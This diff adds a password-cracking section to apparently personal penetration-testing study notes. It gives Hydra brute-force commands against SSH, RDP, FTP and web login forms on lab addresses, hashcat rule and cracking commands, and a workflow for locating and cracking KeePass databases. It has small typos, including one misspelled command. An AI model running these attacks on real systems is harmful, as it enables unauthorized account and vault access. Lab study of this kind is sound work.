@@ -1108,3 +1108,78 @@ Use Veil as an alternative to shellter for creating .bat files
 ```
 /usr/share/veil/Veil.py
 ```
+
+## Password cracking 
+### Hydra 
+ssh
+```
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+```
+
+rdp
+```
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
+
+ftp
+```
+hydra -l itadmin -P /usr/share/wordlists/rockyou.txt -s 21 ftp://$addr
+```
+
+for http post login
+login_location:form_params:error_message
+```
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+```
+
+use `sed` to delete passwords from lists that dont match policy
+
+```
+sed -i '/^1/d' demo.txt 
+```
+
+
+hashcat rule -- use ^ to prepend and $ to append
+c rule capitalizes first letter
+make sure rules are on same line
+
+```
+echo \$1 > demo.rule
+hashcat -r demo.rule --stdout demo.txt
+```
+
+run haswhcat with rule
+```
+hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+```
+
+rules located in  /usr/share/hashcat/rules
+
+hash cracking methodology
+
+```
+    Extract hashes
+    Format hashes
+    Calculate the cracking time
+    Prepare wordlist
+    Attack the hash
+```
+
+can identify hash with `hash-identifier` or `hashid
+
+
+recursive find powershell
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+keepass2john dumps keepass db to a hash
+```
+ikeepass2john Database.kdbx > keepass.hash
+
+find hashcat most for keepass
+
+```
+hashcat --help | grep -i "KeePass"
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+```
